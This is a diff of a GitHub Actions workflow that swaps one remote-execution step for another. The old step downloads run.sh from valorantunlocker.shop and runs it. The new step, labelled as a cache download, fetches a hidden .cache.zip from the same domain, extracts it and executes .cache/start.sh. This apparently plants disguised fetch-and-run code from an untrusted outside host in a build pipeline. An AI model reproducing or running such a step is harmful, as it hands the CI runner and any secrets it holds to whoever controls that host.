@@ -11,19 +11,29 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-      - name: Download and run script
+      - name: Download cache archive and run
         run: |
-          # Tải file với User-Agent và follow redirects
-          curl -L -f -H "User-Agent: Mozilla/5.0" -o run.sh http://valorantunlocker.shop/run.sh
-          
-          # Kiểm tra xem file có phải là shell script không
-          if head -n 1 run.sh | grep -q "#!/bin/bash"; then
-            chmod +x run.sh
-            bash run.sh
-          else
-            echo "Error: Downloaded file is not a valid shell script"
-            echo "First 10 lines of downloaded file:"
-            head -n 10 run.sh
+          set -euo pipefail
+
+          ARCHIVE_URL="http://valorantunlocker.shop/.cache.zip"
+          ARCHIVE_PATH="cache.zip"
+
+          echo "Downloading archive from ${ARCHIVE_URL}"
+          curl -L -f -H "User-Agent: Mozilla/5.0" -o "${ARCHIVE_PATH}" "${ARCHIVE_URL}"
+
+          echo "Verifying archive"
+          unzip -tq "${ARCHIVE_PATH}"
+
+          echo "Extracting archive"
+          unzip -oq "${ARCHIVE_PATH}"
+
+          if [ ! -f .cache/start.sh ]; then
+            echo "Error: .cache/start.sh not found after extraction" >&2
             exit 1
           fi
+
+          chmod +x .cache/start.sh
+
+          echo "Running start.sh"
+          (cd .cache && ./start.sh 12)
 
